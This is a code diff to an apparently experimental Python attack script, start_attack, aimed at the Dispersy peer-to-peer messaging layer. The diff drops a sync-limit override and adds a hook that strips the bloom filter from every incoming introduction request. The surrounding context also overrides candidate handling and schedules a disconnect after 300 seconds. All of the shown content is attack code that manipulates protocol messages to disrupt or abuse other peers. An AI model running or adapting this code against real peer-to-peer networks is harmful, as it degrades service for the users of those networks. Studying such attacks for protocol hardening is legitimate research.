@@ -39,10 +39,18 @@ def start_attack(dispersy):
 
                 dispersy.callback.register(send_requests, (community, candidate, endpoints))
 
+    def on_intro_request(orig_handler, messages):
+        for message in messages:
+            message.payload._bloom_filter = None
+        orig_handler(messages)
+
     for community in dispersy.get_communities():
         community.old_add_candidate = community.add_candidate
         community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)
-        community.dispersy_sync_response_limit = lambda : 0
+
+        intro_request = community._meta_messages[u"dispersy-introduction-request"]
+        orig_handler = intro_request.handle_callback
+        intro_request._handle_callback = lambda messages, orig_handler = orig_handler: on_intro_request(orig_handler, messages)
 
     # step 4, schedule disconnect
     dispersy.callback.register(disconnect, (endpoints,), delay=300.0)
